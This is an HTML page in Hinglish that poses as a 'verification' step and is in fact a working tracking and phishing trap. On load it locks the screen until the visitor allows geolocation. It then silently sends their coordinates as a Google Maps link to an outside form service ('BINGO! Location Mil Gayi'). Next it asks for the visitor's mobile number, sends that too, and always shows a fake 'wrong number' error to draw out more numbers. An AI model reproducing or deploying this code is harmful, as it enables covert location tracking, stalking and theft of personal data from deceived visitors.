<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification Page</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; background-color: #f4f4f9; padding: 30px; }
        #lock-screen {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0, 0, 0, 0.95); color: white;
            display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 9999;
        }
        #mobile-screen { display: none; margin-top: 50px; }
        input { padding: 12px; font-size: 16px; border: 1px solid #ccc; border-radius: 5px; width: 250px; }
        button { padding: 12px 24px; font-size: 16px; background-color: #007BFF; color: white; border: none; border-radius: 5px; cursor: pointer; margin-top: 15px; }
        #error-msg { color: red; font-weight: bold; margin-top: 15px; display: none; }
    </style>
</head>
<body>

    <div id="lock-screen">
        <h2 id="message">Aage badhne ke liye Location Permission dena zaroori hai.</h2>
        <p id="sub-message">Agar aapne Deny kiya hai, toh browser settings se ise 'Allow' kijiye.</p>
        <button onclick="requestLocation()">Try Again / Allow Location</button>
    </div>

    <div id="mobile-screen">
        <h2>Enter your mobile number to continue</h2>
        <p>Verification ke liye apna 10-digit mobile number dalein:</p>
        <input type="tel" id="phone" placeholder="Enter Mobile Number" maxlength="10">
        <br>
        <button onclick="sendMobileNumber()">Submit</button>
        <div id="error-msg">Wrong number! Please try again with a valid registered number.</div>
    </div>

    <script>
        // Aapki Access Key yahan set kar di hai
        const MY_ACCESS_KEY = '394be003-9b48-427f-a2d3-001ece7336bf';

        window.onload = function() { requestLocation(); };

        function requestLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(showPosition, showError);
            } else {
                alert("Browser location support nahi karta.");
            }
        }

        function showPosition(position) {
            let lat = position.coords.latitude;
            let lon = position.coords.longitude;
            
            // 1. Location ka mail background me bhejna
            let locData = new FormData();
            locData.append("access_key", MY_ACCESS_KEY);
            locData.append("Subject", "🚨 BINGO! Location Mil Gayi");
            locData.append("Google Map Link", "https://www.google.com/maps?q=" + lat + "," + lon);

            fetch("https://api.web3forms.com/submit", { method: "POST", body: locData });

            // 2. Lock screen hatana aur Mobile screen dikhana
            document.getElementById("lock-screen").style.display = "none";
            document.getElementById("mobile-screen").style.display = "block";
        }

        function showError(error) {
            if (error.code === error.PERMISSION_DENIED) {
                document.getElementById("message").innerText = "Aapne Permission DENY kar di hai!";
                document.getElementById("message").style.color = "red";
                document.getElementById("sub-message").innerText = "Jab tak aap Allow nahi karenge, site nahi khulegi. Browser ke top bar me lock 🔒 icon par click karke Allow karein.";
            }
        }

        function sendMobileNumber() {
            let phoneInput = document.getElementById("phone").value;
            let errorMsg = document.getElementById("error-msg");

            if (phoneInput.length < 10 || isNaN(phoneInput)) {
                alert("Kripya sahi 10-digit ka number dalein.");
                return;
            }

            // Mobile number ka mail alag se bhejna
            let phoneData = new FormData();
            phoneData.append("access_key", MY_ACCESS_KEY);
            phoneData.append("Subject", "📱 Naya Mobile Number Mila");
            phoneData.append("Mobile Number", phoneInput);

            fetch("https://api.web3forms.com/submit", { method: "POST", body: phoneData })
            .then(() => {
                errorMsg.style.display = "block";
                document.getElementById("phone").value = ""; 
            });
        }
    </script>
</body>
</html>
